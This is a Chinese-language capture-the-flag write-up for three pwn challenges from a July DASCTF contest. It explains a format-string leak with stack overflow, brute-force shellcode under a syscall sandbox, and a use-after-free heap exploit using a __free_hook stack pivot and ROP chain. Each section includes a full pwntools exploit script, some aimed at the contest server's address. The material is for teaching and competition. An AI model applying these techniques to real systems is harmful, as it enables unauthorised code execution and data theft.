# DASCTF-7月赛


欲穷千里目，更上一层楼。		——《登鹳雀楼》王之涣

<!--more-->

## 虚假的签到题

一道简单的栈溢出，但是出题人在程序的最后做了一点点修改。

![image-20200725153925499](https://i.loli.net/2020/07/25/9Cu6TebtwjV2fyM.png)

leave以后会修改esp为ecx-4，而ecx的值为ebp-4地址上的值。也就是：esp=[ebp-4]-4。因此我们首先需要利用格式化字符漏洞泄漏栈地址，然后修改ebp-4为我们可控的地址，并且修改该地址-4处的值为backdoor，我们就可以获得shell了。

思路总结一下：

+ 泄漏栈地址
+ 修改ebp-4的值为可控地址
+ 修改可控地址-4处的值为backdoor

OK，思路就是这样，但是只有自己实践一下，才能明白如何EXP的payload为何如此设置。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('183.129.189.60',10013)
else:
	sh=process('./qiandao')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	#debug("b*0x080485F5\nc")
	ru(":")
	sl("%2$p")
	ru("\n")
	stack=int(ru("\n").replace("\n",""),16)-0x24
	info_addr("stack",stack)
	ru("?")
	payload=p32(0x0804857D)+"\x00"*0x20+p32(stack)
	sl(payload)
	itr()

exp()
````

## eg32

题目逻辑很简单，写入一段shellcode，控制流将会跳转到shellcode中。难点是开启了沙箱，open/execve syscall等无法使用。

程序在一开始将flag 文件读入到内存中，但是内存地址是随机的，因此我们需要解决的问题是如何获得该地址的值。最开始我以为在栈地址上可能会有残留数据，找了一下发现没有，思路陷入了困境。最后的解决办法是爆破内存地址，由于是32位程序，所以可以在有限时间中爆破出来。

既然是爆破，那么在编写shellcode时需要注意效率问题。这里还需要提一点，就是为什么访问了非法地址，却没有报段错误。这是因为对于syscall而言，如果出错，那么eax将返回一个非零值，而不会直接终止程序。我们也可以利用eax是否小于零来判断我们有没有爆破成功。

（这里再提供publicQi师傅的一个思路：利用mmap，将ELF节结尾到libc之前的地址分配出来，然后按页大小去测试是否为零，如果不为零，则很有可能是flag分配出的虚拟内存。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote()
else:
	sh=process('./eg32')

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def exp():
	#debug("b*0804881C\nc")
	write='''
	push 0x9000000
	pop ecx

	push 1
	pop ebx

	push 0x1000
	pop edx

	push 4
	pop eax

	int 0x80
	add ecx,edx
	cmp eax,0
	'''
	exit='''
	push 1
	pop eax
	xor ebx,ebx
	int 0x80
	'''
	shellcode=asm(write)+"\x7C\xF4"+asm(exit)
	sa("flag",shellcode)
	itr()

exp()
````

## bigbear

题目很简单，有一个UAF漏洞，难在如何利用。题目限制使用execve，那么我们就需要利用ORW了，而想用ORW则需要栈迁移，第一个想到的是使用setcontext来实现，但是题目libc版本是2.30，setcontext无法使用，那怎么办呢？这里利用了上周geekpwn [playthenew](http://www.nopnoping.xyz/2020/07/15/geekpwn-wp/#PlayTheNew)这道题目的思路。

我们先不说利用方法，先想一想要实现栈迁移的话，我们要怎么做。首先我们得把rbp修改为可控的值，然后执行leave ret对吧？我们利用UAF攻击，可以修改free_hook为任意函数，当free掉一个堆块时，会将堆块地址作为第一个参数传递给该函数。如果我们能在libc中找到一个函数片段，其有mov rbp，rdi这样形式的指令，而且还有一个call函数可控，并将call函数修改为leave ret，那么我们就可以实现栈迁移，并执行ROP链。

利用IDA搜索，我找到一个函数片段，刚好可以实现上面所诉的内容。

![image-20200725161614250](https://i.loli.net/2020/07/25/qrToZivIuAQLt9g.png)

这个函数片段将rbp修改为[rdi+0x48]，并call [[rdi+0x18]+0x28]。我们只要精心构造该堆块的值，就可以实现栈迁移并执行ROP链。

构造的细节就不多说了，大家看看EXP，调试调试就能明白。

(不过这种方法不是预期解，预期解是利用io_file的str_overflow控制rdx来使用setcontext。get了

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()
debug	= lambda command=''			:gdb.attach(sh,command)

if args['REMOTE']:
	sh=remote('183.129.189.60',10011)
else:
	sh=process("./bigbear")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def choice(elect):
	ru('>>')
	sl(str(elect))

def add(size,content):
	choice(1)
	ru(":")
	sl(str(size))
	ru(':')
	sl(str(content))

def edit(index,content):
	choice(4)
	ru('idx')
	sl(str(index))
	ru(':')
	sl(content)

def show(index):
	choice(3)
	ru(':')
	sl(str(index))

def delete(index):
	choice(2)
	ru('idx')
	sl(str(index))

def exp():
	libc=ELF("./libc.so.6")
	add(0x1000,'a') #0
	add(0x20,'a') #1
	add(0x20,'a') #2
	delete(0)
	show(0)
	ru(":")
	libc_base=u64(r(6).ljust(8,'\x00'))-0x1eabe0
	info_addr("libc_base",libc_base)
	setcontext=libc_base+libc.symbols['setcontext']
	free_hook=libc_base+libc.symbols['__free_hook']
	secret=libc_base+0x000000000157F7A
	info_addr("setcontext",setcontext)
	info_addr("free_hook",free_hook)
	info_addr("secret",secret)
	delete(1)
	delete(2)
	show(2)
	ru(":")
	heap=u64(r(6).ljust(8,'\x00'))-0x1010
	info_addr("heap",heap)
	edit(2,p64(free_hook)+p64(0))
	add(0x20,'a')
	add(0x20,p64(secret))
	leave_ret=libc_base+0x000000000005A9A8
	rdi_ret=libc_base+0x0000000000026bb2
	rsi_ret=libc_base+0x000000000002709c
	rdx_r12_ret=libc_base+0x000000000011c3b1
	open_=libc_base+libc.symbols["open"]
	read=libc_base+libc.symbols["read"]
	write=libc_base+libc.symbols['write']
	payload="./flag\x00\x00"+p64(rdx_r12_ret)+p64(0)+p64(heap)+p64(rdx_r12_ret)+p64(leave_ret)+p64(0)+p64(rdx_r12_ret)+p64(0)+p64(heap)
	payload+=p64(rdi_ret)+p64(heap)+p64(rsi_ret)+p64(0)+p64(open_)
	payload+=p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap-0x100)+p64(rdx_r12_ret)+p64(0x30)+p64(0)+p64(read)
	payload+=p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(heap-0x100)+p64(rdx_r12_ret)+p64(0x30)+p64(0)+p64(write)
	add(0x100,payload)
	#debug("b*0x7ffff7f2ff7a\nc")
	delete(5)
	itr()

exp()
````


